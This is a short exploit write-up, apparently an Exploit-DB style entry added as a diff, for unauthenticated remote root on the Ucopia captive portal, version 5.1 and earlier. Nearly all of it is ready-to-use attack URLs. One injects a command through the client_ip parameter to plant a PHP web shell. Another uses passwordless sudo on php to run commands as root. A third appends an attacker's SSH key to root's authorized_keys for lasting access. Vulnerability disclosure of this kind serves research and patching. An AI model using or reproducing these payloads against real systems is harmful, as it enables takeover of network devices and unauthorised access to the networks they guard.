@@ -1,0 +1,17 @@
+# Exploit Title: Unauthenticated remote root code execution on captive
+portal Ucopia <= 5.1
+# Date: 02/10/17
+# Exploit Author: agix
+# Vendor Homepage: http://www.ucopia.com/
+# Version: <= 5.1
+# Don't know in which version they exactly fixed it.
+# When you connect to Ucopia wifi guest, every requests are redirected to controller.access.network
+
+# First create easier to use php backdoor
+https://controller.access.network/autoconnect_redirector.php?client_ip=127.0.0.1;echo%20'<?php system($_GET[0]);%20?>'>/var/www/html/upload/bd.php;echo%20t
+
+# As php is in sudoers without password...
+https://controller.access.network/upload/bd.php?0=sudo%20/usr/bin/php%20-r%20%27system("id");%27
+
+# Just push your ssh key and get nice root access (ssh is open by default even from wifi guest)
+https://controller.access.network/upload/bd.php?0=sudo%20/usr/bin/php%20-r%20%27system("echo%20ssh-rsa%20AAAA[...]%20>>%20/root/.ssh/authorized_keys");%27
